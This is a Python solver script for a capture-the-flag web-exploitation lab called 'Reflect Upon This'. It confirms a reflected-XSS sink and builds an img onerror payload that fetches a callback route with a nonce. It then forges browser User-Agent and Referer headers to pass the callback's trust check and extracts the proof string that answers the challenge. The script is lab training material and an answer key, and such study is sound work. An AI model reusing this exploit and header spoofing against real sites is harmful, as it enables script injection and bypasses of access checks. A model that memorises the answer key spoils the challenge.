#!/usr/bin/env python3
"""Reflect Upon This (web-exploitation, day 06 curriculum) - single_solve solver.

Flow (derived from live target, Fastify "Search Mirror" app):
  1. GET /                     -> page links /api/clues.
  2. GET /api/clues            -> JSON: feature_route, secondary_route,
                                  current_role, callback_nonce.
  3. GET <feature_route>?q=... -> reflects `q` verbatim inside
                                  <div id="preview">...</div> (reflected XSS sink;
                                  special chars are NOT encoded). The vulnerable
                                  URL a "browser" would visit is
                                  <feature_route>?q=<markup triggering callback>.
  4. The secondary_route is the "isolated callback". It returns
     {"error":"browser_callback_required"} (403) unless the request carries a
     browser-like User-Agent AND a Referer pointing at the feature route, plus
     the current callback_nonce as the `nonce` query parameter. When the
     isolated-browser trust decision is satisfied it answers
     {"ok":true,"effect":"isolated_browser_callback","evidence":"proof_<hex>"}.

The recovered `evidence` proof string is the answer for proof-1.

Stdlib only. Scoped to the single assigned target origin. No GM calls.
"""

import json
import re
import sys
import urllib.parse
import urllib.request

BROWSER_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
TIMEOUT = 30


def http_get(url, headers=None):
    hdrs = {"User-Agent": BROWSER_UA}
    hdrs.update(headers or {})
    req = urllib.request.Request(url, headers=hdrs, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:  # 4xx/5xx bodies are still evidence
        return err.code, err.read().decode("utf-8", "replace")


def solve(base_url):
    base_url = base_url.rstrip("/")
    out = {}

    # Step 1-2: workspace notes / clues
    status, clues_body = http_get(f"{base_url}/api/clues")
    clues = json.loads(clues_body)
    feature_route = clues["feature_route"]
    secondary_route = clues["secondary_route"]
    nonce = clues["callback_nonce"]
    out["clues"] = clues

    # Step 3: confirm the reflected-XSS sink on the feature route
    probe = "reflectprobeZZ9"
    status, page = http_get(
        f"{base_url}{feature_route}?q={urllib.parse.quote(probe)}"
    )
    out["reflection_confirmed"] = probe in page

    # This is the payload URL an isolated browser would be made to visit:
    xss_url = (
        f"{base_url}{feature_route}?q="
        + urllib.parse.quote(
            f'<img src=x onerror=fetch("{secondary_route}?nonce={nonce}")>'
        )
    )
    out["xss_trigger_url"] = xss_url

    # Step 4: land the isolated callback with the browser trust signals
    cb_url = f"{base_url}{secondary_route}?nonce={urllib.parse.quote(nonce)}"
    headers = {
        "User-Agent": BROWSER_UA,
        "Referer": f"{base_url}{feature_route}?q=test",
    }
    status, cb_body = http_get(cb_url, headers=headers)
    out["callback_status"] = status
    out["callback_body"] = cb_body

    m = re.search(r'"evidence"\s*:\s*"(proof_[0-9a-f]+)"', cb_body)
    if not m:
        raise SystemExit(f"no proof in callback response (status {status}): {cb_body}")
    return m.group(1), out


def main():
    if len(sys.argv) >= 2 and sys.argv[1].endswith(".json"):
        with open(sys.argv[1], "r", encoding="utf-8") as fh:
            start = json.load(fh)
        targets = start.get("targets", [])
        if not targets:
            raise SystemExit("start.json has no targets")
        base_url = targets[0]["url"]
    elif len(sys.argv) >= 2:
        base_url = sys.argv[1]
    else:
        raise SystemExit("usage: solve.py <start.json|target-url>")

    proof, evidence = solve(base_url)
    print(json.dumps({"answers": {"proof-1": proof}}, indent=2))
    print(json.dumps({"evidence": evidence}, indent=2), file=sys.stderr)


if __name__ == "__main__":
    main()
